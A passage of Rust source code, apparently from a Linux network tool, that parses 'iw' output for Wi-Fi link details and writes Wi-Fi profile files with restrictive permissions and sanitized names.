        .find(|s| s.kind == "wireless")
        .map(|s| s.name.clone()))
}

pub fn read_wifi_link_info(interface: &str) -> WifiLinkInfo {
    let mut info = WifiLinkInfo::default();
    let output = Command::new("iw").args(["dev", interface, "link"]).output();
    let output = match output {
        Ok(out) => out,
        Err(_) => return info,
    };
    if !output.status.success() {
        return info;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    if stdout.trim().starts_with("Not connected") {
        return info;
    }
    info.connected = true;
    for line in stdout.lines() {
        let line = line.trim();
        if let Some(rest) = line.strip_prefix("SSID:") {
            let ssid = rest.trim();
            if !ssid.is_empty() {
                info.ssid = Some(ssid.to_string());
            }
        } else if let Some(rest) = line.strip_prefix("signal:") {
            let value = rest.trim().split_whitespace().next();
            if let Some(v) = value {
                if let Ok(dbm) = v.parse() {
                    info.signal_dbm = Some(dbm);
                }
            }
        } else if let Some(rest) = line.strip_prefix("tx bitrate:") {
            info.tx_bitrate = Some(rest.trim().to_string());
        }
    }
    info
}

fn wifi_profiles_dir(root: &Path) -> PathBuf {
    root.join("wifi").join("profiles")
}

fn harden_dir_permissions(path: &Path) {
    #[cfg(unix)]
    {
        let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o700));
    }
}

fn write_private_file(path: &Path, data: &[u8]) -> Result<()> {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
        harden_dir_permissions(parent);
    }

    let mut options = fs::OpenOptions::new();
    options.create(true).write(true).truncate(true);
    #[cfg(unix)]
    {
        options.mode(0o600);
    }

    let mut file = options
        .open(path)
        .with_context(|| format!("opening {}", path.display()))?;
    use std::io::Write;
    file.write_all(data)
        .with_context(|| format!("writing {}", path.display()))?;

    #[cfg(unix)]
    {
        let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o600));
    }

    Ok(())
}

fn sanitize_profile_name(input: &str) -> String {
    let mut sanitized = String::new();
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() {
            sanitized.push(ch.to_ascii_lowercase());
        } else if ch.is_whitespace() || ch == '-' || ch == '_' {
            if !sanitized.ends_with('_') {
                sanitized.push('_');
            }
        }
    }
    let trimmed = sanitized.trim_matches('_').to_string();
    if trimmed.is_empty() {
        "profile".to_string()
    } else {
        trimmed
    }
}
